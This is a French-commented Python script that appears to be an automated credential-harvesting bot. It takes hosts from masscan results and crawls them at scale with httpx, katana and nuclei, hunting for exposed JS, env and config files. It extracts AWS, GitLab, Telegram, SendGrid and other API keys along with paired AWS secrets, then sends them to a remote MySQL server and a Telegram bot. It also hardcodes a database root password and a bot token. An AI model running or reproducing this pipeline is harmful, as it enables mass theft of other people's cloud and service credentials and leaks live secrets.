import os
import subprocess
from pathlib import Path
import requests
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import shutil
import datetime
import re
import socket
from concurrent.futures import ThreadPoolExecutor
import threading
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import mysql.connector
from mysql.connector import Error

# Configuration des répertoires
gopath_bin_path = "/home/ubuntu/go/bin"
os.environ['PATH'] += os.pathsep + "/usr/local/go/bin" + os.pathsep + gopath_bin_path
directories = {
    "watched_dir": "./scans",
    "backup_dir": "./backup",
    "queue_dir": "./queue",
    "app_dir": "./app", 
    "log_dir": "./logs"
}
# Créer les répertoires s'ils n'existent pas
for dir_name in directories.values():
    Path(dir_name).mkdir(parents=True, exist_ok=True)
# Créer les fichiers de log s'ils n'existent pas
log_file = Path(directories["log_dir"] + "/new_files.log")
unique_results_file = Path(directories["log_dir"] + "/unique_results.txt")
execution_log_file = Path(directories["log_dir"] + "/execution_log.txt")
log_file.touch()
unique_results_file.touch()
execution_log_file.touch()

# Expressions régulières pour détecter les clés
regex_patterns = {
    r"\b((?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16})\b": "AWS API Key",
    r"(?i)\b((LTAI)[a-z0-9]{20})(?:['|\"|\n|\r|\s|\x60|;]|$)": "Aliyun API Key",
    r"(?i)(?:bitbucket)(?:[0-9a-z\-_\t .]{0,20})(?:[\s|']|[\s|\"]){0,3}(?:=|>|:=|\|\|:|<=|=>|:)(?:'|\"|\s|=|\x60){0,5}([a-z0-9]{32})(?:['|\"|\n|\r|\s|\x60|;]|$)": "Bitbucket App Password",
    r"(?i)(?:bittrex)(?:[0-9a-z\-_\t .]{0,20})(?:[\s|']|[\s|\"]){0,3}(?:=|>|:=|\|\|:|<=|=>|:)(?:'|\"|\s|=|\x60){0,5}([a-z0-9]{32})(?:['|\"|\n|\r|\s|\x60|;]|$)": "Bittrex API Key",
    r"(?i)(?:coinbase)(?:[0-9a-z\-_\t .]{0,20})(?:[\s|']|[\s|\"]){0,3}(?:=|>|:=|\|\|:|<=|=>|:)(?:'|\"|\s|=|\x60){0,5}([a-z0-9_-]{64})(?:['|\"|\n|\r|\s|\x60|;]|$)": "Coinbase API Key",
    r"(?i)\b(dop_v1_[a-f0-9]{64})\b": "DOP v1 API Key",
    r"(?i)\b(doo_v1_[a-f0-9]{64})\b": "DOO v1 API Key",
    r"(?i)(?:discord)(?:[0-9a-z\-_\t .]{0,20})(?:[\s|']|[\s|\"]){0,3}(?:=|>|:=|\|\|:|<=|=>|:)(?:'|\"|\s|=|\x60){0,5}([a-f0-9]{64})(?:['|\"|\n|\r|\s|\x60|;]|$)": "Discord Bot Token",
    r"\b(glpat-[0-9a-zA-Z_-]{20})(?:\b|$)": "GitLab Access Token",
    r"(?i)jenkins.{0,10}(?:crumb)?.{0,10}\b([0-9a-f]{32,36})\b": "Jenkins API Token",
    r"[0-9a-f]{32}-us[0-9]{1,2}": "Unknown Key (US-based format)",
    r"(?i)(?:mailgun|mg).{0,20}key-([a-z0-9]{32})\b": "Mailgun API Key",
    r"SG\.[a-zA-Z0-9-_]{22}\.[a-zA-Z0-9_-]{43}": "SendGrid API Key",
    r"\b(\d+:AA[a-zA-Z0-9_-]{32,33})": "Telegram Bot API Key",
    r"(?i)twilio.{0,20}\b(sk[a-f0-9]{32})\b": "Twilio API Key",
    r"\b((?:ghu|ghs)_[a-zA-Z0-9]{36})\b": "GitHub App Token",
    r"\b(glpat-[0-9a-zA-Z_-]{20})(?:\b|$)": "GitLab Personal Access Token"
}

# Variables pour Telegram
bot_token = "7198578180:AAEIWHXv3E30c2WURDHt-VdUmcZ4tb3KDhI"
chat_id = "6459873636"

def insert_into_table(table_name, columns, values, unique_check_column, unique_value):
    """Insère une ligne dans une table spécifique en évitant les doublons."""
    try:
        connection = mysql.connector.connect(
            host="94.156.67.171",
            user="root",
            password="Stupid!Rac00n666",
            database="rez"
        )
        cursor = connection.cursor()

        # Vérifier si l'entrée existe déjà dans la table
        query_check = f"SELECT COUNT(*) FROM {table_name} WHERE {unique_check_column} = %s"
        cursor.execute(query_check, (unique_value,))
        count = cursor.fetchone()[0]

        if count == 0:
            # Ajouter 'detection_date' automatiquement via `NOW()`
            columns_str = ", ".join(columns)
            placeholders = ", ".join(["%s"] * len(values))
            query = f"INSERT INTO {table_name} ({columns_str}, detection_date) VALUES ({placeholders}, NOW())"
            cursor.execute(query, values)
            connection.commit()
            print(f"Insertion réussie dans {table_name}.")
        else:
            print(f"L'entrée avec {unique_check_column} = '{unique_value}' existe déjà dans {table_name}.")

        cursor.close()
        connection.close()
    except mysql.connector.Error as e:
        print(f"Erreur d'insertion dans {table_name} : {e}")

def insert_key_to_aws_no_secret_table(api_key, url):
    """Insère une clé AWS sans secret dans la table aws_keys_no_secret."""
    insert_into_table(
        table_name="aws_keys_no_secret",
        columns=["api_key", "url"],
        values=[api_key, url],
        unique_check_column="api_key",
        unique_value=api_key
    )

def insert_key_to_aws_table(api_key, secret, url):
    """Insère une clé AWS dans la table MySQL aws_keys."""
    insert_into_table(
        table_name="aws_keys",
        columns=["api_key", "secret", "url"],
        values=[api_key, secret, url],
        unique_check_column="api_key",
        unique_value=api_key
    )

def insert_key_to_other_table(api_key, url, key_type):
    """Insère une clé dans la table other_keys avec son type."""
    insert_into_table(
        table_name="other_keys",
        columns=["api_key", "url", "key_type"],
        values=[api_key, url, key_type],
        unique_check_column="api_key",
        unique_value=api_key
    )

# Obtenir l'IP et le nom d'hôte du serveur hôte
server_ip = socket.gethostbyname(socket.gethostname())
server_hostname = socket.gethostname()

def log_message(message):
    """Écrit un message dans le fichier de log d'exécution."""
    print(message)
    with open(execution_log_file, "a") as log_file:
        log_file.write(f"{datetime.datetime.now()} - {message}\n")

def escape_markdown(text):
    """Échappe les caractères spéciaux Markdown pour Telegram."""
    escape_chars = '_*[]()~`>#+-=|{}.!'
    return ''.join(['\\' + char if char in escape_chars else char for char in text])

def send_telegram_message(message):
    """Envoie un message au canal Telegram."""
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    escaped_message = escape_markdown(message)

    payload = {
        "chat_id": chat_id,
        "text": escaped_message,
        "parse_mode": "Markdown"
    }

    try:
        response = requests.post(url, data=payload)
        if response.status_code != 200:
            print(f"Erreur lors de l'envoi du message Telegram : {response.text}")
    except Exception as e:
        print(f"Erreur de communication avec l'API Telegram : {e}")

def load_notified_keys(file_path):
    """Charge les clés déjà notifiées depuis un fichier."""
    notified_keys = set()
    try:
        with open(file_path, "r") as file:
            for line in file:
                parts = line.strip().split(" from ")
                if len(parts) > 0:
                    notified_keys.add(parts[0])
    except FileNotFoundError:
        print("Fichier des clés notifiées introuvable. Un nouveau fichier sera créé.")
    return notified_keys

api_key_pattern = r"\b((?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16})\b"
secret_pattern = r'["\']([a-zA-Z0-9+/\\=]{40,})["\']'

def find_closest_secret_to_akia(content):
    """Trouve la chaîne de 40 caractères la plus proche de l'API Key AKIA."""
    akia_match = re.search(api_key_pattern, content)
    if not akia_match:
        return None

    akia_position = akia_match.start()
    all_secrets = list(re.finditer(secret_pattern, content))

    closest_secret = None
    smallest_distance = float('inf')
    for secret in all_secrets:
        distance = abs(secret.start() - akia_position)
        if distance < smallest_distance:
            smallest_distance = distance
            closest_secret = secret

    if closest_secret:
        return content[closest_secret.start():closest_secret.end()]
    else:
        return None

def test_url_for_api_secrets(url):
    """Test chaque URL pour les clés API et secrets avec la logique du deuxième script."""
    try:
        response = requests.get(url, verify=False)
        response.raise_for_status()
        page_content = response.text
        closest_secret = find_closest_secret_to_akia(page_content)
        return closest_secret
    except requests.exceptions.RequestException as e:
        log_message(f"Erreur lors de l'accès à {url} : {str(e)}")
        return None

url_regex = r'https?://[^\s]+'

def associate_urls_with_keys(content):
    """Associe les URL aux clés détectées dans le contenu."""
    key_to_info = {}
    urls = re.findall(url_regex, content)

    # Associer les URL aux clés pour tous les types de clés
    for pattern, key_type in regex_patterns.items():
        for match in re.finditer(pattern, content):
            key_str = match.group(0)

            # Trouver l'URL la plus proche avant ou après la clé
            closest_url = min(urls, key=lambda x: abs(content.find(x) - match.start()), default="N/A")

            key_to_info[key_str] = {
                "type": key_type,
                "url": closest_url
            }

    return key_to_info

def process_results_with_regex_and_secrets(content, file_name):
    """Analyse toutes les clés trouvées, envoie des notifications appropriées et stocke les clés dans la base de données."""
    notified_keys = load_notified_keys(unique_results_file)
    new_keys = set()

    # Utiliser la fonction pour associer les URL aux clés
    key_to_info = associate_urls_with_keys(content)

    if not key_to_info:
        log_message("Aucune clé trouvée dans les résultats.")
        return

    # Traiter et notifier les clés uniques
    for key_str, info in key_to_info.items():
        if key_str not in notified_keys:
            if info['type'] == "AWS API Key":
                # AWS: Recherche du secret le plus proche
                closest_secret = test_url_for_api_secrets(info['url'])
                if closest_secret:
                    insert_key_to_aws_table(key_str, closest_secret, info['url'])
                else:
                    insert_key_to_aws_no_secret_table(key_str, info['url'])
            else:
                # Clés non-AWS : pas de recherche de secrets, uniquement des informations basiques
                insert_key_to_other_table(key_str, info['url'], info['type'])

            # Ajouter la clé à notified_keys
            notified_keys.add(key_str)
            new_keys.add(key_str)

    # Mettre à jour le fichier unique_results avec les nouvelles clés
    with open(unique_results_file, "a") as file:
        for key_str in new_keys:
            file.write(f"{key_str} from {key_to_info[key_str]['url']}\n")

def run_command_with_logging(command):
    """Exécute une commande et capture toutes les sorties dans un fichier de log."""
    log_message(f"Exécution de la commande : {command}")
    process = subprocess.Popen(command, shell=True, executable="/bin/bash", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in process.stdout:
        log_message(line.strip())
    process.wait()
    log_message(f"Code de retour : {process.returncode}")
    return process.returncode

processing_files_lock = threading.Lock()
processing_files = set()

def process_file(file_name):
    """Traite un fichier individuel sans threads."""
    with processing_files_lock:
        if file_name in processing_files:
            log_message(f"Le fichier {file_name} est déjà en cours de traitement.")
            return
        processing_files.add(file_name)

    log_message(f"Début du traitement du fichier : {file_name}")

    src_file_path = f"{directories['watched_dir']}/{file_name}"
    dest_file_path = f"{directories['queue_dir']}/{file_name}"
    try:
        shutil.move(src_file_path, dest_file_path)
        log_message(f"Nouveau fichier déplacé vers la file d'attente : {file_name}")

        shutil.copy(dest_file_path, "masscan_output.txt")
        with open("masscan_output.txt", "r") as file:
            masscan_output = file.read()
        targets = re.findall(r"Discovered open port \d+/[tcpudp]+ on (\S+)", masscan_output)
        with open("targets.txt", "w") as file:
            file.writelines(f"{target}\n" for target in targets)

        if not targets:
            send_telegram_message("⚠️ Pas de cibles extraites, arrêt du processus.")
            return

        command = (
            'bash -c "source ~/.bashrc && cat targets.txt | httpx -stream -rl 500 | xargs -I{} -P150 bash -c \'echo {} | timeout 70 katana -u - -em js,php,env,json,yml -d 10 -c 500 | sort -u | nuclei -t ./app/yam.yaml -duc -stream -nh -rl 800\' | tee final_results.txt || true"'
        )
        return_code = run_command_with_logging(command)
        if return_code == 0:
            with open("final_results.txt", "r") as results_file:
                final_results = results_file.read()
            process_results_with_regex_and_secrets(final_results, file_name)
            send_telegram_message(f"⬆️ Processing successful for file {file_name}.\n\n🖥️ *Serveur Hôte* : {server_hostname}\n\n📡 *Adresse IP du Serveur* : {server_ip}")
        else:
            send_telegram_message(f"❌ Processing failed for file {file_name}, return code: {return_code}\n\n🖥️ *Serveur Hôte* : {server_hostname}\n\n📡 *Adresse IP du Serveur* : {server_ip}")
        Path(directories["backup_dir"]).mkdir(parents=True, exist_ok=True)
        backup_file_path = f"{directories['backup_dir']}/{file_name}"
        shutil.move(dest_file_path, backup_file_path)
    except Exception as e:
        log_message(f"Erreur dans process_file : {str(e)}")
    finally:
        with processing_files_lock:
            processing_files.remove(file_name)

def is_file_fully_copied(file_path, wait_time=1, retry=3):
    for _ in range(retry):
        initial_size = os.path.getsize(file_path)
        time.sleep(wait_time)
        if os.path.getsize(file_path) == initial_size:
            return True
    return False

class FileEventHandler(FileSystemEventHandler):
    """Surveille les nouveaux fichiers et les traite immédiatement."""
    def on_created(self, event):
        if not event.is_directory:
            file_path = event.src_path
            if is_file_fully_copied(file_path):
                file_name = os.path.basename(file_path)
                process_file(file_name)
            else:
                log_message(f"Le fichier {file_path} n'a pas fini d'être copié.")

if __name__ == "__main__":
    send_telegram_message(f"⬆️ Bot Discovery démarré avec succès. ⬆️\n\n🖥️ *Serveur Hôte* : {server_hostname}\n\n📡 *Adresse IP du Serveur* : {server_ip}")

    # Traitez les fichiers existants dans le répertoire de surveillance
    for existing_file in Path(directories["watched_dir"]).iterdir():
        if existing_file.is_file():
            process_file(existing_file.name)

    # Initialisez l'observateur pour les nouveaux fichiers
    observer = Observer()
    event_handler = FileEventHandler()
    observer.schedule(event_handler, path=str(directories["watched_dir"]), recursive=False)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

    send_telegram_message(f"🛑 Bot Discovery arrêté. 🛑\n\n🖥️ *Serveur Hôte* : {server_hostname}\n\n📡 *Adresse IP du Serveur* : {server_ip}")
